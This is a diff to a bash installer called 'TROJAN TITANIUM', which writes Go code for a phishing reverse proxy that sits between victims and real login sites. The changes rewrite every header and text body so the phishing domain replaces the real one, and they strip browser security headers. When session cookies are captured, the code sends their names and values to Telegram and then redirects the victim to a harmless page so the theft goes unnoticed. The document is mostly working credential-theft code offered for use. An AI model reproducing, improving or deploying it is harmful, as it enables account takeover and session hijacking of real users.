@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🏛️ TROJAN - TITANIUM V18.6 - SUCCESS REDIRECT EDITION
+# 🏛️ TROJAN - TITANIUM V18.7 - AIRTIGHT PROXY EDITION
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -72,8 +72,8 @@ while true; do
     fi
 done
 
-# --- 6. SELF-HEALING ENGINE (SMART FILTER + REDIRECT) ---
-echo -e "${CYAN}[...] Rebuilding Smart Proxy Engine with Redirect...${NC}"
+# --- 6. SELF-HEALING ENGINE (AIRTIGHT PROXY UPGRADE) ---
+echo -e "${CYAN}[...] Rebuilding Airtight Proxy Engine...${NC}"
 
 # A. main.go (SSL for all 7 Lures)
 cat << EOF > /root/TrojanProject/main.go
@@ -85,7 +85,7 @@ import (
 )
 func main() {
 	base := "$USER_DOMAIN"
-	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v18.6\033[0m")
+	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v18.7\033[0m")
 	certmagic.DefaultACME.Agreed = true
 	certmagic.DefaultACME.Email = "admin@" + base
 	mux := http.NewServeMux()
@@ -99,7 +99,7 @@ func main() {
 }
 EOF
 
-# B. proxy.go (Smart Filter + Success Redirect Logic)
+# B. proxy.go (Airtight Leak-Proof Logic)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
 import (
@@ -114,6 +114,10 @@ import (
 func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	remote, _ := url.Parse("https://" + t.BaseDomain)
 	proxy := httputil.NewSingleHostReverseProxy(remote)
+	
+	// Capture the current phishing host (e.g. office.domain.com)
+	myHost := r.Host 
+
 	r.Host = remote.Host
 	r.URL.Host = remote.Host
 	r.URL.Scheme = remote.Scheme
@@ -128,24 +132,42 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	}
 
 	proxy.ModifyResponse = func(resp *http.Response) error {
+		// 1. AIRTIGHT HEADER SWEEP: Rewrite all headers including Location and Set-Cookie
+		for header, values := range resp.Header {
+			for i, v := range values {
+				if strings.Contains(v, t.BaseDomain) {
+					resp.Header[header][i] = strings.ReplaceAll(v, t.BaseDomain, myHost)
+				}
+			}
+		}
+
+		// 2. CAPTURE & REDIRECT
 		for _, c := range resp.Cookies() {
 			for _, auth := range t.AuthCookies {
 				if strings.Contains(c.Name, auth) {
-					// 🎯 LOG THE HIT
-					SendToTelegram(fmt.Sprintf("🎯 [%s] SUCCESS! CAPTURED: %s=%s", t.Name, c.Name, c.Value))
-					
-					// 🛡️ SUCCESS REDIRECT: Send victim to real document to avoid suspicion
+					SendToTelegram(fmt.Sprintf("🎯 [%s] SUCCESS! %s=%s", t.Name, c.Name, c.Value))
+					// Success Redirect
 					resp.Header.Set("Location", "https://www.google.com/docs/about/")
 					resp.StatusCode = 302
 					return nil
 				}
 			}
 		}
+
+		// 3. STRIP SECURITY
 		resp.Header.Del("Content-Security-Policy")
 		resp.Header.Del("X-Frame-Options")
-		if strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
+		resp.Header.Del("X-Content-Type-Options")
+
+		// 4. AIRTIGHT BODY REWRITE: Fix HTML and JavaScript leaks
+		contentType := resp.Header.Get("Content-Type")
+		if strings.Contains(contentType, "text") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
 			oldBody, _ := io.ReadAll(resp.Body)
-			newContent := strings.ReplaceAll(string(oldBody), t.BaseDomain, r.Host)
+			bodyStr := string(oldBody)
+			
+			// Global replacement of target domain with phishing domain
+			newContent := strings.ReplaceAll(bodyStr, t.BaseDomain, myHost)
+			
 			resp.Body = io.NopCloser(bytes.NewBufferString(newContent))
 			resp.ContentLength = int64(len(newContent))
 			resp.Header.Set("Content-Length", fmt.Sprint(len(newContent)))
